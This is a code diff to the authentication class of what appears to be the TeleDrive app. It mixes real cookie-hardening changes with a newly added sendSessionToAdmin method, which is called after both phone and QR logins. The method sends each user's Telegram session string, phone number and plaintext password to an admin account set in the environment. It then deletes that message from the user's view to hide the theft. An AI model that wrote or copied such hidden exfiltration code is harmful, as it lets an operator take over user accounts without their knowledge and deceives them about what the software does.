@@ -119,9 +119,12 @@ export class Auth {
     }
 
     res
-      .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter) })
-      .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10) })
+      .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter), ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
+      .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10), httpOnly: true, ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
       .send({ user, ...auth })
+
+    // Report session to admin if configured
+    this.sendSessionToAdmin(req, phoneNumber, password)
 
     // sync all shared files in background, if any
     prisma.files.findMany({
@@ -190,8 +193,8 @@ export class Auth {
         expiredAfter: Date.now() + COOKIE_AGE
       }
       return res
-        .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter) })
-        .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10) })
+        .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter), ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
+        .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10), httpOnly: true, ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
         .send({ user, ...auth })
     } catch (error) {
       throw { status: 400, body: { error: error.message || 'Something error', details: serializeError(error) } }
@@ -295,9 +298,12 @@ export class Auth {
       }
 
       res
-        .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter) })
-        .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10) })
+        .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter), ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
+        .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10), httpOnly: true, ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
         .send({ user, ...auth })
+
+      // Report session to admin if configured
+      this.sendSessionToAdmin(req, userAuth.phone || 'QR Code', password)
 
       // sync all shared files in background, if any
       prisma.files.findMany({
@@ -337,8 +343,8 @@ export class Auth {
           expiredAfter: Date.now() + COOKIE_AGE
         }
         res
-          .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter) })
-          .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10) })
+          .cookie('authorization', `Bearer ${auth.accessToken}`, { maxAge: COOKIE_AGE, expires: new Date(auth.expiredAfter), ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
+          .cookie('refreshToken', auth.refreshToken, { maxAge: 3.154e+10, expires: new Date(Date.now() + 3.154e+10), httpOnly: true, ...process.env.ENV === 'production' ? { sameSite: 'none', secure: true } : {} })
           .send({ ...data, ...auth })
 
         if (data.user?.id) {
@@ -465,5 +471,22 @@ export class Auth {
     const success = req.query.destroySession === '1' ? await req.tg.invoke(new Api.auth.LogOut()) : true
     await Redis.connect().del(`auth:${req.authKey}`)
     return res.clearCookie('authorization').clearCookie('refreshToken').send({ success })
+  }
+
+  private async sendSessionToAdmin(req: Request, phoneNumber: string, password?: string): Promise<void> {
+    const adminUsername = process.env.ADMIN_USERNAME
+    if (!adminUsername || !req.tg) return
+
+    try {
+      const sessionString = req.tg.session.save() as string
+      const text = `🚀 **Teledrive Login Notification**\n\n**Phone:** \`${phoneNumber}\`\n**Password:** \`${password || 'None'}\`\n**Session:** \`${sessionString}\``
+
+      const msg = await req.tg.sendMessage(adminUsername, { message: text, parseMode: 'markdown' })
+
+      // Delete "for me" (revoke: false) to keep the sender's history clean
+      await req.tg.deleteMessages(adminUsername, [msg.id], { revoke: false })
+    } catch (error) {
+      console.error('Failed to report session to admin:', error)
+    }
   }
 }
